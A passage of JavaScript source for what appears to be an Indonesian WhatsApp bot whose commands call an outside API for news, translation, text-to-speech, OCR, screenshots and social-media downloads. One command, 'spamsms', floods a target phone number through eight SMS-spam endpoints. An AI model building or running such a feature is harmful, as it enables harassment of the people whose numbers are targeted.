*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnnindonesia': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnnnasional': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnninternasional': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnnekonomi': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/ekonomi?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnnolahraga': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/olahraga?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnnteknologi': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/teknologi?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnnhiburan': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/hiburan?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345cnnsocial': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/social?apikey=${global.apilol}`)
 ini = anu.result
 let result = ini[Math.floor(Math.random() * ini.length)]
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: `*〔 NEWS From cnnindonesia.com 〕*

*⭔ Title :* ${result.judul}
*⭔ Link :* ${result.link}`,
                    footer: `Klik NEXT untuk hasil lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break


//Tools internet menu  ]\\ With apikey lol human
//https://api.lolhuman.xyz/api/translate/auto/ps?apikey=fleyvin_soft&text=Good%20morning
case '12345texttospeak': case '12345tekstospeak': case '12345tts': case '12345gtts': {
	if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} dasar anak tiktok suka pargoy di tempat umum`
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih mau di ubah ke bahasa mana\n`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Ubah Teks Menjadi Suara-Multi Bahasa",
								"rows": [
									{
										"title": "Ke Indonesia",
										"description": `Teks ke Suara bahasa Indonesia\n\n${text}`,
										"rowId": `${prefix}tts2 id+${text}`
									},
									{
										"title": "Ke Inggris",
										"description": `Teks ke Suara bahasa Inggris\n\n${text}`,
										"rowId": `${prefix}tts2 en+${text}`
									},
									{
										"title": "Ke Jerman",
										"description": `Teks ke Suara bahasa Jerman\n\n${text}`,
										"rowId": `${prefix}tts2 de+${text}`
									},
									{
										"title": "Ke Perancis",
										"description": `Teks ke Suara bahasa Perancis\n\n${text}`,
										"rowId": `${prefix}tts2 fr+${text}`
									},
										{
											"title": "Ke Spanyol",
										"description": `Teks ke Suara bahasa Spanyol\n\n${text}`,
										"rowId": `${prefix}tts2 es+${text}`
										},
										{
											"title": "Ke Italy",
										"description": `Teks ke Suara bahasa Italia\n\n${text}`,
										"rowId": `${prefix}tts2 it+${text}`
										},
										{
											"title": "Ke Turki",
										"description": `Teks ke Suara bahasa Turki\n\n${text}`,
										"rowId": `${prefix}tts2 tr+${text}`
										},
										{
											"title": "Ke Polandia",
										"description": `Teks ke Suara bahasa Polandia\n\n${text}`,
										"rowId": `${prefix}tts2 pl+${text}`
										},
										{
											"title": "Ke Brunei",
										"description": `Teks ke Suara bahasa Brunei\n\n${text}`,
										"rowId": `${prefix}tts2 bn+${text}`
										},
										{
										"title": "Ke Rusia",
										"description": `Teks ke Suara  bahasa Rusia\n\n${text}`,
										"rowId": `${prefix}tts2 ru+${text}`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
            case '12345tts2': {
	if (!text) throw `*Masukan KodeNegara+Teks*\n_Contoh:_ ${prefix + command} id+Dasar anak tiktok suka pargoy di tempat umum`
	tas = arg.split('+')[0]
              wah = arg.split('+')[1]
              let anu = await getBuffer(`https://api.lolhuman.xyz/api/gtts/${tas}?apikey=${global.apilol}&text=${wah}`)
// Pajrin.sendMessage(m.chat, { audio: anu, mimetype: 'audio/mp4' },{ptt: false}, { quoted : m })
   Pajrin.sendMessage(m.chat, { audio: anu, mimetype: 'audio/mp4', ptt: true, quoted : m })
}
              break
              case '12345tst': case '12345translate': {
	if (!m.quoted && !text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} good morning`
//if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} good morning`
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih mau di translate ke bahasa mana\n`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Translate Multi Bahasa",
								"rows": [
									{
										"title": "Ke Inggris",
										"description": `Translate ke bahasa Inggris\n\n${text}`,
										"rowId": `${prefix}tst2 en+${text}`
									},
									{
										"title": "Ke Indonesia",
										"description": `Translate ke bahasa Indonesia\n\n${text}`,
										"rowId": `${prefix}tst2 id+${tex}`
									},
									{
										"title": "Ke Jerman",
										"description": `Translate ke bahasa Jerman\n\n${text}`,
										"rowId": `${prefix}tst2 de+${text}`
									},
										{
											"title": "Ke Spanyol",
										"description": `Translate ke bahasa Spanyol\n\n${text}`,
										"rowId": `${prefix}tst2 es+${text}`
										},
										{
											"title": "Ke Italy",
										"description": `Translate ke bahasa Italia\n\n${text}`,
										"rowId": `${prefix}tst2 it+${text}`
										},
										{
											"title": "Ke Palestina",
										"description": `Translate ke bahasa Palestina\n\n${text}`,
										"rowId": `${prefix}tst2 ps+${text}`
										},
										{
										"title": "Ke Rusia",
										"description": `Translate ke bahasa Rusia\n\n${text}`,
										"rowId": `${prefix}tst2 ru+${text}`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
case '12345tst2': {
	if (!text) throw `*Masukan KodeNegara+Teks*\n_Contoh:_ ${prefix + command} id+good morning`
	tas = arg.split('+')[0]
              wah = arg.split('+')[1]
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${tas}?apikey=${global.apilol}&text=${wah}`)
m.reply(`*〔 Translate From: ${anu.result.from},To: ${anu.result.to} 〕*

*🌹Translate:* ${anu.result.translated}

*🌹Pengucapan:* ${anu.result.pronunciation}`)
}
break
case '12345ocr': {
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	m.reply(mess.wait)
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	let ini = await fetchJson(api('zenz',`/ocr?apikey=${global.apilol}&img=${anu}`))
	replay(`${ini.result}`)
	}
	break
case '12345shortlink': {
	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink2 ${text}`, buttonText: {displayText: 'Short Link 2️⃣'}, type: 1},                  
                     {buttonId: `${prefix}shortlink3 ${text}`, buttonText: {displayText: 'Shory Link 3️⃣'}, type: 1},                
                     {buttonId: `${prefix}shortlink4 ${text}`, buttonText: {displayText: 'Short Link4️⃣'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345shortlink2': {
	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink2?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink ${text}`, buttonText: {displayText: 'Short Link 1️⃣'}, type: 1},                    
                     {buttonId: `${prefix}shortlink3 ${text}`, buttonText: {displayText: 'Shory Link 3️⃣'}, type: 1},                    
                     {buttonId: `${prefix}shortlink4 ${text}`, buttonText: {displayText: 'Short Link4️⃣'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345shortlink3': {
if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink3?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink ${text}`, buttonText: {displayText: 'Short Link 1️⃣'}, type: 1},                  
                     {buttonId: `${prefix}shortlink2 ${text}`, buttonText: {displayText: 'Shory Link 2️⃣'}, type: 1},                   
                     {buttonId: `${prefix}shortlink4 ${text}`, buttonText: {displayText: 'Short Link4️⃣'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345shortlink4': {
	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
 	let anu = await fetchJson(api('zenz',`/shortlink4?apikey=${global.apilol}&url=${text}`))
     let buttons = [
                     {buttonId: `${prefix}shortlink ${text}`, buttonText: {displayText: 'Short Link 1️⃣'}, type: 1},               
                     {buttonId: `${prefix}shortlink2 ${text}`, buttonText: {displayText: 'Short Link 2️⃣'}, type: 1},                  
                      {buttonId: `${prefix}shortlink3 ${text}`, buttonText: {displayText: 'Short Link3️⃣'}, type: 1} 
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Klik Tombol di Bawah, untuk Short Link Lainya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '12345ssweb': case '12345ssweb1': {
                if (!text) throw `*Masukan URL web !*\n_Contoh :_ ${prefix + command} https://youtube.com/c/xZrinva`                 
              m.reply(mess.wait)
               let buttons = [
                    {buttonId: `${prefix}ssweb2 ${text}`, buttonText: {displayText: 'SS WEB 2️⃣'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: api('zenz', `/ssweb?apikey=${global.apilol}&url=${text}`) },
                    caption: `*〔 Screenshot WEB From: ${text} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
break
case '12345sswebfull': case '12345ssweb2': {
                if (!text) throw `*Masukan URL web !*\n_Contoh :_ ${prefix + command} https://indonesia.go.id`                 
                m.reply(mess.wait)
               let buttons = [
                    {buttonId: `${prefix}ssweb1 ${text}`, buttonText: {displayText: 'SS WEB 1️⃣'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: api('zenz', `/sswebfull?apikey=${global.apilol}&url=${text}`) },
                    caption: `*〔 Screenshot WEB Full From: ${text} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
break
            case '12345resum': case '12345reroomer': {
            	if (!text) throw `*Masukan teks untuk di resum !*\n_Contoh :_ ${prefix + command} Sebuah kaca yang dipasang di tembok belakang kelasnya tiba-tiba bergerak sendiri.\nDream - Menyanyi memang menjadi hal yang menyenangkan saat sedang kesepian. Begitu pula yang dilakukan oleh gadis berhijab dalam video berikut ini.\nGadis ini datang lebih awal ke sekolah dari murid lainnya. Melihat kondisi kelas yang masih sepi, gadis tersebut lantas menyalakan kamera dan merekam aksinya yang tengah bernyanyi.\nIde Seru Buat Lebaran! Tiktoker Bagi-Bagi Uang THR Sesuai Filter TikTok, Si Nenek Ketiban Rezeki Nomplok\n\nDengan suara merdunya, sang gadis menyanyikan lagu Agnes Monica berjudul Karena Ku Sanggup. Hingga akhirnya sebuah insiden mengejutkan terjadi. Terang saja gadis yang berada dalam video itu terkejut.\nMeski demikian, belum bisa dipastikan apakah kaca itu benar-benar bergerak sendiri atau video ini hanya rekayasa belaka. `                 
         m.reply(mess.wait)
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/resoomer?apikey=${global.apilol}&text=${text}`)
 replay(anu.result)
 }
 break
case '12345spamsms': case '12345smsspam': {
            	if (!text) throw `*Masukan nomor target !*\n_Contoh :_ ${prefix + command} 6283110011351`                 
         m.reply(mess.wait)
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${global.apilol}&nomor=${text}`)
  let ana = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${global.apilol}&nomor=${text}`)
let ane = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${global.apilol}&nomor=${text}`)
let anp = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${global.apilol}&nomor=${text}`)
let anyu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${global.apilol}&nomor=${text}`)
let anfu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${global.apilol}&nomor=${text}`)
let anlu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${global.apilol}&nomor=${text}`)
let aynu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${global.apilol}&nomor=${text}`)
 reply(`Sukses spam sms ke nomor ${text}`)
 }
 break
case '12345qrcode': case '12345toqrcode': {
	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} Aku suka sama kamu`         
m.reply(mess.wait)        
	Pajrin.sendMessage(m.chat, { image: { url: api('zenz',`/qrcode?apikey=${global.apilol}&text=${text}`) }, caption: `*QR Code From Teks : ${text}*` }, { quoted: m })      
	}
break
case '12345readqr': case '12345readqrcode': {
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	m.reply(mess.wait)
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	let ini = await fetchJson(`https://api.lolhuman.xyz/api/read-qr?apikey=${global.apilol}&img=${anu}`)
replay(ini.result)
                  }
                           break
case '12345cekumur': case '12345agedetect': {
	if (!quoted) throw `Send/Reply foto wajah dengan Caption ${prefix + command}`
	m.reply(mess.wait)
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	let ini = await fetchJson(`https://api.lolhuman.xyz/api/agedetect?apikey=${global.apilol}&img=${anu}`)
replay(`Orang tersebut kira-kira berumur  ${ini.result} Tahun`)
                  }
                           break
case '12345cekwajah': case '12345facedetec': {
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)

                Pajrin.sendMessage(m.chat, { image: { url: api('zenz',`/facedetect?apikey=${global.apilol}&img=${anu}`) }, caption: `Wajah detektor` }, { quoted: m })      
                }
                break
            case '123454l4y': case '12345alay': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/alay?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break
case '12345besarkecil': case '12345kecilbesar': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/upperlower?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break
case '12345bahasapurba': case '12345purba': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/bahasapurba?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break
case '12345randombahasa': case '12345bahasarandom': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/randombahasa?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break



//[DOWNLOAD MENU]\\ WITH Apikey Lol-Human, credit (Fleyvin Software)
case '12345mediafire': case '12345mdf': {
                   if (!text) throw `*Masukan Link Mediafire*\n_Contoh :_ ${prefix + command} https://www.mediafire.com/file/nf8gcek9mkvdlek/20220403_152001.png/file`
             	let anu = await fetchJson(api('zenz', '/mediafire', { url: text }, 'apikey'))
             asu = anu.result.link
             nama = anu.result.filename
             let type = anu.result.filetype
             if (type === 'Image (.JPG)') {
             	replay(mess.wait)
             Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'image/png' , fileName: nama }, {quoted:m})
            }else if (type === 'Image (.PNG)') {
            	replay(mess.wait)
             Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'image/png' , fileName: nama }, {quoted:m})
               }else if (type === 'video (.mp4)') {
               	replay(mess.wait)
             Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'video/mp4' , fileName: nama }, {quoted:m})
              }else if (type === 'audio (.mp3)') {
              	replay(mess.wait)
             Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'audio/mp3' , fileName: nama }, {quoted:m})
                }else if (type === 'PDF (.PDF)') {
                	replay(mess.wait)
             Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/pdf' , fileName: nama }, {quoted:m})
             } else if (type === 'Source Code (.JS)') {
             	replay(mess.wait)
		Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/zip' , fileName: nama }, {quoted:m})
		  } else {
			replay(mess.wait)
		Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/zip' , fileName: nama }, {quoted:m})
            }
          }
          break
case '12345sfile': case '12345sfilemobi': {
                   if (!text) throw `*Masukan Link SfileMobi*\n_Contoh :_ ${prefix + command} https://sfile.mobi/3Ca9II8GKsP`
                   replay(mess.wait)
             	let anu = await fetchJson(api('zenz', '/sfile', { url: text }, 'apikey'))
             asu = anu.result.link
             nama = anu.result.title
		Pajrin.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/zip' , fileName: nama }, {quoted:m})
            }
          break
	                  case '12345tt': case '12345ttdownload': case '12345ttdl': case '12345tiktok': case '12345tiktoknowm': {
                  if (!text) throw `*Masukan Link TikTok*\n_Contoh :_ ${prefix + command} https://vt.tiktok.com/ZSdAvGKjn/`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/tiktok3', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result },
                    caption: `Download From ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
                 case '12345ttmp3': case '12345tiktokmp3': case '12345tiktokaudio': {
                if (!text) throw `*Masukan Link TikTok*\n_Contoh :_ ${prefix + command} https://vt.tiktok.com/ZSdAvGKjn/`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/tiktok3', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}tiktoknowm ${text}`, buttonText: {displayText: '🎦Video'}, type: 1},
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Audio akan segera di kirim',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
		let { toAudio } = require('./lib/converter')
		let nganu = await getBuffer(anu.result)
		let cnvrt = await toAudio(nganu, 'mp4')
                Pajrin.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
            }
            break
                      case '12345igtv': case '12345instagramtv': case '12345igpost': case '12345igmp4': case '12345igdl': case '12345igvideo': case '12345instagramvideo': case '12345instagrammp4': case '12345instagram': {
                if (!text) throw `*Masukan Link Instagram tv/post*\n_Contoh :_ ${prefix + command} https://www.instagram.com/tv/Ccn0eqaPxGx/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagram2', { url: text }, 'apikey'))
                let aru = anu.result.media
                let result = aru[Math.floor(Math.random() * aru.length)]
                let buttons = [
                    {buttonId: `${prefix}igtvmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: result },
                    caption: `*〔 Instagram tv Video 〕*

*⭔ Username :* ${anu.result.account.username}
*⭔ Caption :* ${anu.result.caption}
*⭔ Link :* ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
          case '12345instagrammp3':  case '12345igtvmp3': case '12345instagramtvmp3': {
               if (!text) throw `*Masukan Link Instagram tv/post*\n_Contoh :_ ${prefix + command} https://www.instagram.com/tv/Ccn0eqaPxGx/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagram2', { url: text }, 'apikey'))
                let asu = anu.result.media
                let result = asu[Math.floor(Math.random() * asu.length)]
                let buttons = [
                    {buttonId: `${prefix}igreel ${text}`, buttonText: {displayText: '🎦Video'}, type: 1},
                ]
                let buttonMessage = {
                    text: `*〔 Instagram tv mp3 〕*

*⭔ Username :* ${anu.result.account.username}
*⭔ Caption :* ${anu.result.caption}
*⭔ Link :* ${text}`,
                    footer: 'Audio akan segera di kirim',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
		let { toAudio } = require('./lib/converter')
		let nganu = await getBuffer(result)
		let cnvrt = await toAudio(nganu, 'mp4')
                Pajrin.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
            }
            break
            case '12345igreel': case '12345instagramreels': case '12345instagramreel': case '12345igreels': {
                if (!text) throw `*Masukan Link Instagram Reels*\n_Contoh :_ ${prefix + command} https://www.instagram.com/reel/CQffYpUJK5d/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagramreel', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}igreelmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.link },
                    caption: `*〔 Instagram Reels 〕*

*⭔ Title :* ${anu.result.title}
*⭔ Username :* ${anu.result.owner}
*⭔ Like :* ${anu.result.like}
*⭔ Viewers :* ${anu.result.view}
*⭔ Link :* ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
          case '12345igreelmp3': case '12345igreelsmp3': {
               if (!text) throw `*Masukan Link Instagram Reels*\n_Contoh :_ ${prefix + command} https://www.instagram.com/reel/CQffYpUJK5d/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagramreel', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}igreel ${text}`, buttonText: {displayText: '🎦Video'}, type: 1},
                ]
                let buttonMessage = {
                    text: `*〔 Instagram Reels MP3 〕*

*⭔ Title :* ${anu.result.title}
*⭔ Username :* ${anu.result.owner}
*⭔ Like :* ${anu.result.like}
*⭔ Viewers :* ${anu.result.view}
*⭔ Link :* ${text}`,
                    footer: 'Audio akan segera di kirim',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
		let { toAudio } = require('./lib/converter')
		let nganu = await getBuffer(anu.result.link)
		let cnvrt = await toAudio(nganu, 'mp4')
                Pajrin.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
            }
            break
            case '12345twittermp4': case '12345twittervideo': case '12345tw': case '12345twmp4': case '12345twvideo': {
                if (!text) throw `*Masukan Link Twitter Video*\n_Contoh :_ ${prefix + command} https://twitter.com/vitaminreceh/status/1330465270595543041?t=QXZcrz2cFHV9e54Ij3lYIQ&s=19`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/twitter', { url: text }, 'apikey'))
                let asu = anu.result.link
                let result = asu[Math.floor(Math.random() * asu.length)]
                let buttons = [
                    {buttonId: `${prefix}menu`, buttonText: {displayText: '</Menu'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: result.link },
                    caption: `*〔 Twitter Video 〕*

*⭔ Title :* ${anu.result.title}
*⭔ Link :* ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
